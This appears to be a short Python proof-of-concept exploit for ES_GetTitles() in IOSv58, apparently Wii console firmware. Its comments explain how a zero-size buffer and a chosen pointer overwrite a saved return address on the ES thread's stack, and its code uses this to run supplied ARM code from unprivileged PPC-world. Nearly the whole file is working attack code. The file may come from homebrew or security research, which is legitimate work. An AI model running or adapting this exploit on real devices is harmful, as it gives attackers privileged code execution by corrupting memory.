#!/usr/bin/python3
""" es_gettitles_write.py
Demonstrate a bug in ES_GetTitles() (for IOSv58) that can be used as an 8-byte 
write-primitive on ARM-world, from unprivileged PPC-world.
"""

from sys import argv
from struct import pack, unpack
from hexdump import hexdump
from pyronic.client import *

BAD_POINTER     = 0x201125b0
NUM_ENTRIES     = 0x00000000

if len(argv) < 2:
    print("usage: {} <target binary>".format(argv[0]))
    exit(0)

with open(argv[1], "rb") as f:
    stub_data = f.read()

ipc = IPCClient()

# The bug (triggered when the output buffer size is zero) causes the ES thread 
# to write 8 bytes (0x00010001xxxxxxxx) to some address. This particular bad 
# pointer targets the current stack frame, and writes the value 0x00010001 on 
# the saved LR.
#
# For IOSv58, the layout of the stack seems to be deterministic-enough that
# this is reliable (and reliable on the actual hardware too).

bad_buffer = ipc.alloc_raw(0, paddr=BAD_POINTER)

# If we put some target ARM code at 0x00010000, execution (in the ES context)
# will jump to it (in Thumb mode).

stub_buffer = ipc.alloc_buf(stub_data, paddr=0x00010000)

# Get a handle to the ES module and send the ioctlv for ES_GetTitles().
# Depending on what code you decide to run, this ioctlv may or may not return.

fd = ipc.IOSOpen("/dev/es")
res = ipc.IOSIoctlv(fd, 0x0f, "i:d", NUM_ENTRIES, bad_buffer)

print("ES_GetTitles() returned {}".format(res))
ipc.IOSClose(fd)
ipc.shutdown()

